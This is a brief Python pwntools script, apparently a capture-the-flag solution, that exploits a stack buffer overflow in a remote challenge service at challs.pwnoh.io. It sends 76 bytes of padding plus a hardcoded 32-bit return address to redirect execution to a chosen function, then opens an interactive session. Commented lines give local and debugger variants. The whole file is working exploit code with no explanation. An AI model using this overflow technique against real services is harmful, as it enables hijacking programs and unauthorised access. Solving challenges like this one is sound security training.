from pwn import *

context.terminal = "kitty"

# io = process('./run')
# io = gdb.debug('./run', 'b get_favorite_food')
# io = remote("localhost", 8002)
io = remote("challs.pwnoh.io", 13401)

func_addr = p32(0x080491d6)

io.sendline(b'a' * 76 + func_addr)

io.interactive()
